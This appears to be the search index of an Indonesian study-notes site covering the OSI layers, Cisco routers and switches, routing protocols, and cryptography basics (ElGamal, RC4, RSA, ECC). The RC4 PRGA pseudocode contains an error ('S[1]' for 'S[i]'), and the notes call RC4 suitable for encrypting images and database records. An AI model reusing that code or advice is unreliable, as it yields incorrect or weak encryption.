Transport Menyediakan end-to-end communication protocol . Bertanggung jawab atas \"keselamatan data\" dan \"segmentasi data\", seperti mengatur flow control , error detection dan correction , data sequencing , dan size of the packet TCP, UDP, SPX, SCTP, IPX Network Menentukan rute yang dilalui oleh data. Menyediakan logical addressing dan path determination IP, ICMP, IPsec, ARP, RIP, BGP, OSPF, NBF, IPX Data Link Menentukan pengalamatan fisik, deteksi error, frame flow control , dan topologi network. 2 Sublayer: Logical Link Control (LLC), Media Access Control (MAC). LLC mengatur error notification dan flow control . MAC mengatur pengalamatan fisik guna komunikasi antar adapter 802.3 (Ethernet), 802.11a/b/g/n MAC/LLC, 802.1Q (VLAN), ATM, HDP, PPP, Token Ring , Fibre Channel , Frame Relay Physical Berkaitan dengan kelistrikan/gelombang/medan, tegangan/arus listrik, jenis kabel/konektor, pergantian fasa, mengalirkan bit-bit antar device 802.11a/b/g/n PHY, DSL, hub , repeater , fibre optics , RS-232, V.35, V.34, I.430, I.431, POTS, SONET","title":"Tabel Fungsi OSI"},{"location":"jarkom/osi_layer/#komunikasi-antar-layer","text":"komunikasi dapat berlangsung secara vertikal maupun horizontal","title":"Komunikasi Antar Layer"},{"location":"jarkom/osi_layer/#aliran-informasi-layer","text":"frame trailer digunakan sebagai kendali kecepatan transfer atau flow control, frame trailer juga disebut FCS (frame check sequence)","title":"Aliran Informasi Layer"},{"location":"jarkom/osi_layer/#referensi","text":"Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Referensi"},{"location":"jarkom/ospf/","text":"OSPF \u00b6","title":"OSPF"},{"location":"jarkom/ospf/#ospf","text":"","title":"OSPF"},{"location":"jarkom/perangkat_cisco/","text":"Perangkat Cisco \u00b6 Router \u00b6 Jenis \u00b6 Fiexd access router Memiliki interface tetap (tidak dapat diganti-ganti). Biasanya digunakan untuk membangun WAN yang sederhana. 700 series 801-804, 805, 811, 813, 827 1000 series 2000 series 2500 series 3000 series Modular access router Memiliki interface yang dapat diganti-ganti. Biasanya untuk membangun WAN yang lebih kompleks 1600 series 1720 & 1750 series 2500 series 2600 series 3600 series 4000 series Modular access router for enterprise Memiliki interface yang dapat diganti-ganti dan menyediakan fitur-fitur tambahan. Biasanya untuk membangun WAN yang lebih kompleks. Router ini banyak dipakai diperusahaan besar atau enterprise 7000 series 10000 & 12000 series Cara Mengoperasikan \u00b6 Diperlukan perangkat untuk mengoperasikan router Cisco. Dapat dilakukan dengan PC ke router menggunakan kanel khusus. Koneksi dapat dilakukan via: console connection modem connection network connection ( telnet/SSH ) Ketika perangkat belum di- setting , maka koneksi dilakukan via console port pada router ke seriar port pada PC dengan kabel rollover ( console cable ) dan adaptor RJ-45 to DB-9 atau RJ-45 to USB Switch \u00b6 Jenis \u00b6 Desktop and Workgroup Switches Switch yang digunakan sebagai pengganti hub . biasanya digunakan pada workgroups / small office . 1548 Micro Switch 10/100 1900/2820 Switches 2900XL and 3500XL Switches 3000 Switches 2900 Switches Data center and backbone Switches Untuk keperluan network skala besar atau network yang dinamikanya tinggi. 2900 Switches 4000 Switches 5000 Switches 6000 Switches 8500 Switches Cara Kerja \u00b6 Cara kerja switch dapat dikelompokkan menjadi: Cut through atau fast forward Switch jenis ini hanya menganalisa alamat tujuan (yang ada pada header frame ). Selanjutnya frame diteruskan ke host tujuan. Kondisi ini dapat mengurangi \"waktu tunggu\" atau latency . Merupakan jenis switch \"tercepat\" diantara jenis lain. Kelemahannya tidak dapat menganalisa frame-frame error , frame error akan tetap diteruskan ke host tujuan. Store and forward Switch akan menyimpan semua frame untuk sementara waktu sebelum diteruskan ke host . Seluruh frame akan dianalisis melalui mekanisme CRC ( Cyclic Redundancy Check ). Jika terdapat error maka frame akan dibuang dan tidak diteruskan. Merupakan jenis switch \"terpercaya\" diantara jenis lain. Kelemahannya adalah meningkatnya latency akibat pengecekan frame . Fragment free atau modified cut through Switch akan membaca 64 byte dari frame sebelum diteruskan ke host. 64 byte ini merupakan jumlah minimum byte yang dianggap penting untuk menentukan menentukan apakah frame dapat dinyatakan error atau tidak. Kinerja switch ini dinilai cukup baik dan tetap dapat diandalkan. Cara Mengoperasikan \u00b6 Konfigurasi dan pemasangan sama seperti router Referensi \u00b6 Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Perangkat Cisco"},{"location":"jarkom/perangkat_cisco/#perangkat-cisco","text":"","title":"Perangkat Cisco"},{"location":"jarkom/perangkat_cisco/#router","text":"","title":"Router"},{"location":"jarkom/perangkat_cisco/#jenis","text":"Fiexd access router Memiliki interface tetap (tidak dapat diganti-ganti). Biasanya digunakan untuk membangun WAN yang sederhana. 700 series 801-804, 805, 811, 813, 827 1000 series 2000 series 2500 series 3000 series Modular access router Memiliki interface yang dapat diganti-ganti. Biasanya untuk membangun WAN yang lebih kompleks 1600 series 1720 & 1750 series 2500 series 2600 series 3600 series 4000 series Modular access router for enterprise Memiliki interface yang dapat diganti-ganti dan menyediakan fitur-fitur tambahan. Biasanya untuk membangun WAN yang lebih kompleks. Router ini banyak dipakai diperusahaan besar atau enterprise 7000 series 10000 & 12000 series","title":"Jenis"},{"location":"jarkom/perangkat_cisco/#cara-mengoperasikan","text":"Diperlukan perangkat untuk mengoperasikan router Cisco. Dapat dilakukan dengan PC ke router menggunakan kanel khusus. Koneksi dapat dilakukan via: console connection modem connection network connection ( telnet/SSH ) Ketika perangkat belum di- setting , maka koneksi dilakukan via console port pada router ke seriar port pada PC dengan kabel rollover ( console cable ) dan adaptor RJ-45 to DB-9 atau RJ-45 to USB","title":"Cara Mengoperasikan"},{"location":"jarkom/perangkat_cisco/#switch","text":"","title":"Switch"},{"location":"jarkom/perangkat_cisco/#jenis_1","text":"Desktop and Workgroup Switches Switch yang digunakan sebagai pengganti hub . biasanya digunakan pada workgroups / small office . 1548 Micro Switch 10/100 1900/2820 Switches 2900XL and 3500XL Switches 3000 Switches 2900 Switches Data center and backbone Switches Untuk keperluan network skala besar atau network yang dinamikanya tinggi. 2900 Switches 4000 Switches 5000 Switches 6000 Switches 8500 Switches","title":"Jenis"},{"location":"jarkom/perangkat_cisco/#cara-kerja","text":"Cara kerja switch dapat dikelompokkan menjadi: Cut through atau fast forward Switch jenis ini hanya menganalisa alamat tujuan (yang ada pada header frame ). Selanjutnya frame diteruskan ke host tujuan. Kondisi ini dapat mengurangi \"waktu tunggu\" atau latency . Merupakan jenis switch \"tercepat\" diantara jenis lain. Kelemahannya tidak dapat menganalisa frame-frame error , frame error akan tetap diteruskan ke host tujuan. Store and forward Switch akan menyimpan semua frame untuk sementara waktu sebelum diteruskan ke host . Seluruh frame akan dianalisis melalui mekanisme CRC ( Cyclic Redundancy Check ). Jika terdapat error maka frame akan dibuang dan tidak diteruskan. Merupakan jenis switch \"terpercaya\" diantara jenis lain. Kelemahannya adalah meningkatnya latency akibat pengecekan frame . Fragment free atau modified cut through Switch akan membaca 64 byte dari frame sebelum diteruskan ke host. 64 byte ini merupakan jumlah minimum byte yang dianggap penting untuk menentukan menentukan apakah frame dapat dinyatakan error atau tidak. Kinerja switch ini dinilai cukup baik dan tetap dapat diandalkan.","title":"Cara Kerja"},{"location":"jarkom/perangkat_cisco/#cara-mengoperasikan_1","text":"Konfigurasi dan pemasangan sama seperti router","title":"Cara Mengoperasikan"},{"location":"jarkom/perangkat_cisco/#referensi","text":"Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Referensi"},{"location":"jarkom/rip/","text":"","title":"RIP"},{"location":"jarkom/routing/","text":"Protokol Routing \u00b6 Digunakan untuk menentukan rute terbaik mencapai tujuan Jenis \u00b6 Interior Routing Protocol / Interior Routing Protocol RIP RIPv2 RIPng IGRP EIGRP EIGRP ipv6 OSPF OSPFv2 OSPFv3 IS-IS IS-IS ipv6 protokol ini hanya bekerja sebagai sebuah independent network system atau autonomous system . Exterior Routing Protocol EGP BGPv4 BGPv4 ipv6 protokol ini dapat bekerja antar beberapa buah independent network system atau autonomous system . Jenis Berdasarkan Proses \u00b6 Distance Vector RIP RIPv2 RIPng IGRP AppleTalk RMP Link State OSPF OSPFv2 OSPFv3 IS-IS IS-IS ipv6 Hybrid EIGRP EIGRP ipv6 Path Vector EGP BGPv4 BGPv4 ipv6","title":"Protokol Routing"},{"location":"jarkom/routing/#protokol-routing","text":"Digunakan untuk menentukan rute terbaik mencapai tujuan","title":"Protokol Routing"},{"location":"jarkom/routing/#jenis","text":"Interior Routing Protocol / Interior Routing Protocol RIP RIPv2 RIPng IGRP EIGRP EIGRP ipv6 OSPF OSPFv2 OSPFv3 IS-IS IS-IS ipv6 protokol ini hanya bekerja sebagai sebuah independent network system atau autonomous system . Exterior Routing Protocol EGP BGPv4 BGPv4 ipv6 protokol ini dapat bekerja antar beberapa buah independent network system atau autonomous system .","title":"Jenis"},{"location":"jarkom/routing/#jenis-berdasarkan-proses","text":"Distance Vector RIP RIPv2 RIPng IGRP AppleTalk RMP Link State OSPF OSPFv2 OSPFv3 IS-IS IS-IS ipv6 Hybrid EIGRP EIGRP ipv6 Path Vector EGP BGPv4 BGPv4 ipv6","title":"Jenis Berdasarkan Proses"},{"location":"jarkom/rr/","text":"Route Redistribution \u00b6 Alasan menggunakan berbagai protokol: menggunakan aplikasi yang hanya berjalan pada protokol tertentu menggunakan hardware dari berbagai vendor yang mengharuskan menggabungkan protokol harus menghubungkan network dengan area atau domain routing yang dikelola orang lain melakukan proses migrasi yang melibatkan beberapa protokol routing menggabungkan IGP dan BGP agar route redistribution dapat dilakukan, haruslah ada minimal sebuah router dengan prasyarat: menggunakan sekurang-kurangnya sebuah physical link, yang sudah berfungsi, yang menghubungkan masing-masing routing domain tiap domain sudah dikonfigurasi tiap routing protokol sudah dikonfigurasi untuk melakukan route redistribution Beberapa cara/teknik menentukan rute: Route maps prefix list distribute lists passive interface administrative distance offset-lists IOS IP SLA Policy Based Routing Router(config)# route-map {tag} permit | deny [sequence_number] statement ditandai dengan sequence number, dan akan dibaca dari sequence number terendah. permit berarti trafik yang cocok akan diproses deny berarti trafik yang cocok tidak akan diproses router berhenti membaca statement ketika sudah match dengan trafik yang dianalisa jika diakhir statement tidak dijumpai kecocokan maka trafik akan di-deny. https://networklessons.com/cisco/ccnp-route/introduction-to-route-maps Match condition : ip address ip address prefix-list ip next-hop ip route-source length metric route-type tag Set condition : metric metric-type tag Beberapa implementasi route-map : Filtering redistributed routes pendistribusian rute, menggunakan keyword route-map Policy-based routing menentukan kebijakan routing berdasarkan syarat tertentu BGP policy mengendalikan routing update dan memanipulasi path attributes Referensi \u00b6 Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Route Redistribution"},{"location":"jarkom/rr/#route-redistribution","text":"Alasan menggunakan berbagai protokol: menggunakan aplikasi yang hanya berjalan pada protokol tertentu menggunakan hardware dari berbagai vendor yang mengharuskan menggabungkan protokol harus menghubungkan network dengan area atau domain routing yang dikelola orang lain melakukan proses migrasi yang melibatkan beberapa protokol routing menggabungkan IGP dan BGP agar route redistribution dapat dilakukan, haruslah ada minimal sebuah router dengan prasyarat: menggunakan sekurang-kurangnya sebuah physical link, yang sudah berfungsi, yang menghubungkan masing-masing routing domain tiap domain sudah dikonfigurasi tiap routing protokol sudah dikonfigurasi untuk melakukan route redistribution Beberapa cara/teknik menentukan rute: Route maps prefix list distribute lists passive interface administrative distance offset-lists IOS IP SLA Policy Based Routing Router(config)# route-map {tag} permit | deny [sequence_number] statement ditandai dengan sequence number, dan akan dibaca dari sequence number terendah. permit berarti trafik yang cocok akan diproses deny berarti trafik yang cocok tidak akan diproses router berhenti membaca statement ketika sudah match dengan trafik yang dianalisa jika diakhir statement tidak dijumpai kecocokan maka trafik akan di-deny. https://networklessons.com/cisco/ccnp-route/introduction-to-route-maps Match condition : ip address ip address prefix-list ip next-hop ip route-source length metric route-type tag Set condition : metric metric-type tag Beberapa implementasi route-map : Filtering redistributed routes pendistribusian rute, menggunakan keyword route-map Policy-based routing menentukan kebijakan routing berdasarkan syarat tertentu BGP policy mengendalikan routing update dan memanipulasi path attributes","title":"Route Redistribution"},{"location":"jarkom/rr/#referensi","text":"Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Referensi"},{"location":"jarkom/snmp/","text":"","title":"SNMP"},{"location":"jarkom/ssdp/","text":"","title":"SSDP"},{"location":"jarkom/syn/","text":"","title":"SYN"},{"location":"jarkom/tftp/","text":"","title":"TFTP"},{"location":"jarkom/udp/","text":"UDP \u00b6","title":"UDP"},{"location":"jarkom/udp/#udp","text":"","title":"UDP"},{"location":"jarkom/vlan/","text":"VLAN \u00b6 Referensi \u00b6 Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"VLAN"},{"location":"jarkom/vlan/#vlan","text":"","title":"VLAN"},{"location":"jarkom/vlan/#referensi","text":"Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Referensi"},{"location":"kripto/","text":"","title":"Index"},{"location":"kripto/aes/","text":"","title":"AES Basic"},{"location":"kripto/blowfish/","text":"","title":"Blowfish Basic"},{"location":"kripto/des/","text":"","title":"DES Basic"},{"location":"kripto/dh/","text":"","title":"Diffie-Hellman Basic"},{"location":"kripto/ecc/","text":"ECC \u00b6 Menawarkan keamanan yang sama dengan RSA, ElGamal, Diffie-Hellman, tapi dengan ukuran yang lebih kecil klaim 160-bit menyediakan keamanan setara 1024-bit RSA cocok untuk piranti nirkabel Teori Aljabar Abstrak \u00b6 Konsep aljabar abstrak: Group Field Group \u00b6 Group adalah sistem aljabar yang terdiri dari: sebuah himpunan G sebuah operasi biner * sedemikian sehingga untuk semua elemen \\(a\\) , \\(b\\) , dan \\(c\\) di dalam G berlaku aksioma berikut: Closure : \\(a\\) * \\(b\\) harus berada di dalam G Asosiatif : \\(a\\) * ( \\(b\\) * \\(c\\) ) = ( \\(a\\) * \\(b\\) ) * \\(c\\) Elemen netral : terdapat \\(e \\in G\\) sedemikian sehingga \\(a\\) * \\(e\\) = \\(e\\) * \\(a\\) = \\(a\\) Elemen invers : terdapat \\(a' \\in G\\) sedemikian sehingga \\(a\\) * \\(a'\\) = \\(a'\\) * \\(a\\) = \\(e\\) Notasi : <G, *> <G, +> menyatakan sebuah group dengan operasi penjumlahan <G, \\(\\cdot\\) > menyatakan sebuah group dengan operasi perkalian contoh-contoh group: <R, +> : group dengan himpunan bilangan rill dengan operasi + \\(e\\) = 0 dan \\(a'\\) = \\(-a\\) <R*, \\(\\cdot\\) > : group dengan himpunan bilangan rill tidak nol (yaitu, R* = R-{0}) dengan operasi \\(\\cdot\\) \\(e\\) = 1 dan \\(a'\\) = \\(\\frac{1}{a}\\) <Z, +> dan <Z, \\(\\cdot\\) > : masing-masing adalah group dengan himpunan bilagan bulat dengan operasi + dan \\(\\cdot\\)","title":"ECC Basic"},{"location":"kripto/ecc/#ecc","text":"Menawarkan keamanan yang sama dengan RSA, ElGamal, Diffie-Hellman, tapi dengan ukuran yang lebih kecil klaim 160-bit menyediakan keamanan setara 1024-bit RSA cocok untuk piranti nirkabel","title":"ECC"},{"location":"kripto/ecc/#teori-aljabar-abstrak","text":"Konsep aljabar abstrak: Group Field","title":"Teori Aljabar Abstrak"},{"location":"kripto/ecc/#group","text":"Group adalah sistem aljabar yang terdiri dari: sebuah himpunan G sebuah operasi biner * sedemikian sehingga untuk semua elemen \\(a\\) , \\(b\\) , dan \\(c\\) di dalam G berlaku aksioma berikut: Closure : \\(a\\) * \\(b\\) harus berada di dalam G Asosiatif : \\(a\\) * ( \\(b\\) * \\(c\\) ) = ( \\(a\\) * \\(b\\) ) * \\(c\\) Elemen netral : terdapat \\(e \\in G\\) sedemikian sehingga \\(a\\) * \\(e\\) = \\(e\\) * \\(a\\) = \\(a\\) Elemen invers : terdapat \\(a' \\in G\\) sedemikian sehingga \\(a\\) * \\(a'\\) = \\(a'\\) * \\(a\\) = \\(e\\) Notasi : <G, *> <G, +> menyatakan sebuah group dengan operasi penjumlahan <G, \\(\\cdot\\) > menyatakan sebuah group dengan operasi perkalian contoh-contoh group: <R, +> : group dengan himpunan bilangan rill dengan operasi + \\(e\\) = 0 dan \\(a'\\) = \\(-a\\) <R*, \\(\\cdot\\) > : group dengan himpunan bilangan rill tidak nol (yaitu, R* = R-{0}) dengan operasi \\(\\cdot\\) \\(e\\) = 1 dan \\(a'\\) = \\(\\frac{1}{a}\\) <Z, +> dan <Z, \\(\\cdot\\) > : masing-masing adalah group dengan himpunan bilagan bulat dengan operasi + dan \\(\\cdot\\)","title":"Group"},{"location":"kripto/elgamal/","text":"ElGamal \u00b6 Keutamaan \u00b6 Sulitnya menghitung algoritma diskrit Masalah logaritma diskrit: jika \\(p\\) adalah bilangan prima dan \\(g\\) & \\(y\\) adalah sembarang bilangan bulat. Carilah \\(x\\) sedemikian sehingga \\(g^x \\equiv y (\\bmod p)\\) Properti \u00b6 bil.prima \\(p\\) bil.acak \\(g\\) ( \\(g<p\\) ) bil.acak \\(x\\) ( \\(x<p\\) ) (kc.privat) \\(y = g^x \\bmod p\\) (kc.publik) plaintext \\(m\\) ciphertext \\(a\\) & \\(b\\) Algoritma pembangkitan kunci \u00b6 pilih sembarang bil.prima \\(p\\) , dapat dishare diantara anggota pilih sembarang \\(g\\) & \\(x\\) , g < p, 1 <= x <= p-2 hitung \\(y = g^x \\bmod p\\) hasil : kc.publik: tripel(y,g,p) kc.privat: pasangan(x,p) Algoritma Enkripsi \u00b6 susun plaintext menjadi blok-blok, [0,p-1] pilih bilangan acak \\(k\\) , 1 <= k <= p-2 setiap blok \\(m\\) dienkripsi dengan rumus \\[ \\begin{align} a &= g^k \\bmod p \\\\ b &= (y^k)m \\bmod p \\end{align} \\] pasangan \\(a\\) & \\(b\\) adalah ciphertext utk blok \\(m\\) , jadi ukuran ciphertext 2x ukuran plaintextnya Algoritma Dekripsi \u00b6 gunakan kc.privat \\(x\\) utk menghitung \\((a^x)^{-1} = a^{p-1-x} \\bmod p\\) hitung plaintext m dengan persamaan: \\[ \\begin{align} m &= \\frac{b}{a^x} \\bmod p \\\\ &= b((a^x)^{-1}) \\bmod p \\end{align} \\] Contoh \u00b6 a. pembangkitan kunci (oleh alice) misal : \\[ \\begin{align} p &= 2357\\\\ g &= 2\\\\ x &= 1751\\\\ \\end{align} \\] hitung: \\[ \\begin{align} y & = g^x \\bmod p \\\\ & = 2^{1751} \\bmod 2357 \\\\ & = 1185 \\end{align} \\] hasil: kc.publik: (y=1185, g=2, p=2357) kc.privat: (x=1751, p=2357) b. enkripsi (oleh bob) misal : \\(m = 2035\\) (nilai \\(m\\) masih berada [0, 2357-1]) bob memilih bilangan acak \\(k = 1520\\) (nilai \\(k\\) masih berada [0, 2357-1]) bob menghitung : \\[ \\begin{align} a &= g^k \\bmod p \\\\ &= 2^{1520} \\bmod 2357 \\\\ &= 1430 \\end{align} \\] \\[ \\begin{align} b &= (y^k)m \\bmod p \\\\ &= (1185^{1520})2035 \\bmod 2357 \\\\ &= 697 \\end{align} \\] jadi ciphertext yg dihasilkan adalah (1430, 697) bob mengirim ke alice c. dekripsi (oleh alice) \\[ \\begin{align} \\frac{1}{a^x} &= (a^x)^{-1} \\\\ &= a^{p-1-x} \\bmod p \\\\ &= 1430^{2357-1-1751} \\bmod 2357\\\\ &= 872 \\end{align} \\] \\[ \\begin{align} m &= \\frac{b}{a^x} \\bmod p\\\\ &= b((a^x)^{-1}) \\bmod p\\\\ &= 697 \\cdot 872 \\bmod 2357\\\\ &= 2035 \\end{align} \\]","title":"El Gamal Basic"},{"location":"kripto/elgamal/#elgamal","text":"","title":"ElGamal"},{"location":"kripto/elgamal/#keutamaan","text":"Sulitnya menghitung algoritma diskrit Masalah logaritma diskrit: jika \\(p\\) adalah bilangan prima dan \\(g\\) & \\(y\\) adalah sembarang bilangan bulat. Carilah \\(x\\) sedemikian sehingga \\(g^x \\equiv y (\\bmod p)\\)","title":"Keutamaan"},{"location":"kripto/elgamal/#properti","text":"bil.prima \\(p\\) bil.acak \\(g\\) ( \\(g<p\\) ) bil.acak \\(x\\) ( \\(x<p\\) ) (kc.privat) \\(y = g^x \\bmod p\\) (kc.publik) plaintext \\(m\\) ciphertext \\(a\\) & \\(b\\)","title":"Properti"},{"location":"kripto/elgamal/#algoritma-pembangkitan-kunci","text":"pilih sembarang bil.prima \\(p\\) , dapat dishare diantara anggota pilih sembarang \\(g\\) & \\(x\\) , g < p, 1 <= x <= p-2 hitung \\(y = g^x \\bmod p\\) hasil : kc.publik: tripel(y,g,p) kc.privat: pasangan(x,p)","title":"Algoritma pembangkitan kunci"},{"location":"kripto/elgamal/#algoritma-enkripsi","text":"susun plaintext menjadi blok-blok, [0,p-1] pilih bilangan acak \\(k\\) , 1 <= k <= p-2 setiap blok \\(m\\) dienkripsi dengan rumus \\[ \\begin{align} a &= g^k \\bmod p \\\\ b &= (y^k)m \\bmod p \\end{align} \\] pasangan \\(a\\) & \\(b\\) adalah ciphertext utk blok \\(m\\) , jadi ukuran ciphertext 2x ukuran plaintextnya","title":"Algoritma Enkripsi"},{"location":"kripto/elgamal/#algoritma-dekripsi","text":"gunakan kc.privat \\(x\\) utk menghitung \\((a^x)^{-1} = a^{p-1-x} \\bmod p\\) hitung plaintext m dengan persamaan: \\[ \\begin{align} m &= \\frac{b}{a^x} \\bmod p \\\\ &= b((a^x)^{-1}) \\bmod p \\end{align} \\]","title":"Algoritma Dekripsi"},{"location":"kripto/elgamal/#contoh","text":"a. pembangkitan kunci (oleh alice) misal : \\[ \\begin{align} p &= 2357\\\\ g &= 2\\\\ x &= 1751\\\\ \\end{align} \\] hitung: \\[ \\begin{align} y & = g^x \\bmod p \\\\ & = 2^{1751} \\bmod 2357 \\\\ & = 1185 \\end{align} \\] hasil: kc.publik: (y=1185, g=2, p=2357) kc.privat: (x=1751, p=2357) b. enkripsi (oleh bob) misal : \\(m = 2035\\) (nilai \\(m\\) masih berada [0, 2357-1]) bob memilih bilangan acak \\(k = 1520\\) (nilai \\(k\\) masih berada [0, 2357-1]) bob menghitung : \\[ \\begin{align} a &= g^k \\bmod p \\\\ &= 2^{1520} \\bmod 2357 \\\\ &= 1430 \\end{align} \\] \\[ \\begin{align} b &= (y^k)m \\bmod p \\\\ &= (1185^{1520})2035 \\bmod 2357 \\\\ &= 697 \\end{align} \\] jadi ciphertext yg dihasilkan adalah (1430, 697) bob mengirim ke alice c. dekripsi (oleh alice) \\[ \\begin{align} \\frac{1}{a^x} &= (a^x)^{-1} \\\\ &= a^{p-1-x} \\bmod p \\\\ &= 1430^{2357-1-1751} \\bmod 2357\\\\ &= 872 \\end{align} \\] \\[ \\begin{align} m &= \\frac{b}{a^x} \\bmod p\\\\ &= b((a^x)^{-1}) \\bmod p\\\\ &= 697 \\cdot 872 \\bmod 2357\\\\ &= 2035 \\end{align} \\]","title":"Contoh"},{"location":"kripto/hash/","text":"","title":"HASH Basic"},{"location":"kripto/ntru/","text":"","title":"NTRU Basic"},{"location":"kripto/rc4/","text":"RC4 \u00b6 Stream Cipher Digunakan : SSL WEP WPA RC4 memproses data dalam ukuran byte RC4 terdiri dari 2 sub-proses : Key-Scheduling Algorithm (KSA) Pseudo-random Generation Algorithm (PRGA) KSA \u00b6 Inisiasi larik \\(S\\) : \\(S_0\\) = 0, \\(S_1\\) = 1, ..., \\(S_{255}\\) = 255 Pengacakan berdasarkan kunci eksternal K j = 0 for i in {0..255} j = (j + S[i] + K[i % len(k)]) % 256 swap(S[i], S[j]) PRGA \u00b6 PRGA membangkitkan keystream dengan cara mengambil nilai \\(S[i]\\) dan \\(S[j]\\) , mempertukarkannya, lalu menjumlahkan keduanya dalam modulus 256 Keystream tersebut kemudian di-XOR-kan dengan sebuah karakter plainteks i = 0 j = 0 for idx in {0..len(P)-1} i = (i+1) % 256 j = (j+S[1]) % 256 swap(S[i], S[j]) t = (S[i] + S[j]) % 256 u = S[t] c = u (+) P[idx] Keamanan RC4 \u00b6 RC4 adalah stream cipher, maka ia tidak kuat terhadap serangan seperti flip-bit attack maupun serangan stream attack lainnya Aplikasi \u00b6 Cocok untuk enkripsi berkas citra (derajat keabuan 0-255) Cocok untuk enkripsi record atau field basis data","title":"RC4 Basic"},{"location":"kripto/rc4/#rc4","text":"Stream Cipher Digunakan : SSL WEP WPA RC4 memproses data dalam ukuran byte RC4 terdiri dari 2 sub-proses : Key-Scheduling Algorithm (KSA) Pseudo-random Generation Algorithm (PRGA)","title":"RC4"},{"location":"kripto/rc4/#ksa","text":"Inisiasi larik \\(S\\) : \\(S_0\\) = 0, \\(S_1\\) = 1, ..., \\(S_{255}\\) = 255 Pengacakan berdasarkan kunci eksternal K j = 0 for i in {0..255} j = (j + S[i] + K[i % len(k)]) % 256 swap(S[i], S[j])","title":"KSA"},{"location":"kripto/rc4/#prga","text":"PRGA membangkitkan keystream dengan cara mengambil nilai \\(S[i]\\) dan \\(S[j]\\) , mempertukarkannya, lalu menjumlahkan keduanya dalam modulus 256 Keystream tersebut kemudian di-XOR-kan dengan sebuah karakter plainteks i = 0 j = 0 for idx in {0..len(P)-1} i = (i+1) % 256 j = (j+S[1]) % 256 swap(S[i], S[j]) t = (S[i] + S[j]) % 256 u = S[t] c = u (+) P[idx]","title":"PRGA"},{"location":"kripto/rc4/#keamanan-rc4","text":"RC4 adalah stream cipher, maka ia tidak kuat terhadap serangan seperti flip-bit attack maupun serangan stream attack lainnya","title":"Keamanan RC4"},{"location":"kripto/rc4/#aplikasi","text":"Cocok untuk enkripsi berkas citra (derajat keabuan 0-255) Cocok untuk enkripsi record atau field basis data","title":"Aplikasi"},{"location":"kripto/rsa/","text":"RSA \u00b6 RSA adalah asymmetric encryption algorithm Properti \u00b6 \\(p\\) & \\(q\\) prima \\(n = p . q\\) \\(\u03c6(n) = (p-1)(q-1)\\) \\(e\\) (kunci enkripsi) syarat: \\(GCD(e, \u03c6(n)) = 1\\) \\(d\\) (kunci dekripsi) \\(d \u2261 e^{-1} \\ mod(\u03c6(n))\\) \\(m\\) \\(c\\) Penurunan Rumus RSA \u00b6 Prinsip: teorema Euler \\(\u03b1^{\u03c6(n)} \u2261 1 \\ (mod \\ n)\\) Syarat: \\(\u03b1\\) harus relatif prima terhada \\(n\\) \\(\u03c6(n)\\) = totien euler fungsi yang menentukan berapa banyak dari bilangan 1,2,3,...,n yang relatif prima terhadap \\(n\\) cth. \\(\u03c6(20) = 8\\) 1,3,7,9,11,13,17,19 \\(\u03c6(n) = \u03c6(p).\u03c6(q) = (p-1)(q-1)\\) \\[ \\begin{align} \u03b1^{\u03c6(n)} &\\equiv 1 \\ (\\bmod n) & \\text{(dipangkatkan $k$)} \\\\ \u03b1^{k\u03c6(n)} &\\equiv 1^k \\ (\\bmod n)\\\\ \u03b1^{k\u03c6(n)} &\\equiv 1 \\ (\\bmod n) & \\text{(ubah $\u03b1$ jadi $m$)} \\\\ m^{k\u03c6(n)} &\\equiv 1 \\ (\\bmod n) & \\text{(kali dengan $m$)} \\\\ m^{(k\u03c6(n)+1)} &\\equiv m \\ (\\bmod n) \\end{align} \\] Misalkan e dan d dipilih sedemikian sehingga \\[ \\begin{align} e . d &\\equiv 1 \\ (\\bmod \u03c6(n)) \\\\[2ex] &\\text{atau} \\\\[2ex] e . d &\\equiv k\u03c6(n)+1 \\\\[2ex] &\\text{maka} \\\\[2ex] m^{k\u03c6(n)+1} &\\equiv m \\ (\\bmod \\ n)\\\\ m^{e.d} &\\equiv m \\ (\\bmod \\ n)\\\\ (m^e)^d &\\equiv m \\ (\\bmod \\ n)\\\\ \\end{align} \\] Rumus \u00b6 Enkripsi: \\(E_e(m) = c \\equiv m^e \\bmod n\\) Dekripsi: \\(D_d(c) = m \u2261 c^d \\bmod n\\) Prosedur Pembangkitan Sepasang Kunci \u00b6 pilih \\(p\\) & \\(q\\) hitung \\(n\\) hitung \\(\u03c6(n)\\) pilih \\(e\\) hitung kunci dekripsi dengan persamaan \\(ed \\equiv 1 (\\bmod \u03c6(n))\\) atau \\(d \\equiv e^{-1} (\\bmod \u03c6(n))\\) \\(d\\) dapat dihitung menggunakan algoritma euclidean : \\[ d = \\frac{1+k\u03c6(n)}{e} \\] RSA Certificate \u00b6 biasanya key disimpan dalam bentuk hexadesimal atau certificate (base64) key1.pub -----BEGIN PUBLIC KEY----- MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQAuooQ4N7bQo2lnsPOZQwk6 0RRBGMbBqvbH5M3lSyw9X/crGczaLBkNcDsrhFOpECGDOnieTKc/mHH1ogKg4sH/ d708Ma/vrHu/VeT3ViCW5Uu4N21P3ON3M3mUs0+QUmMAy8egwXi+Mgfcu5KYpaw+ eIGwV6oRQ317sa+VBf4i9cebtVRQkIL8pYY3XKHfexPXXtjbCS0Q+B+GPoy1gkGV L1zrfcaVwU7wyMz5Je9n47GXm8PsurbzsaEoCP2finuX8NmkWFP5QsCOG8Ci14RG MajpSwaVkyFRycx8DcmzPan04P8jnKmfCVg42ufVdvMAskbh/z1qoyGdK9zJ4FdP AgMBAAE= -----END PUBLIC KEY----- menggunakan openssl openssl rsa -pubin -in key1.pub -text -noout output : RSA Public-Key: (2046 bit) Modulus: 2e:a2:84:38:37:b6:d0:a3:69:67:b0:f3:99:43:09: 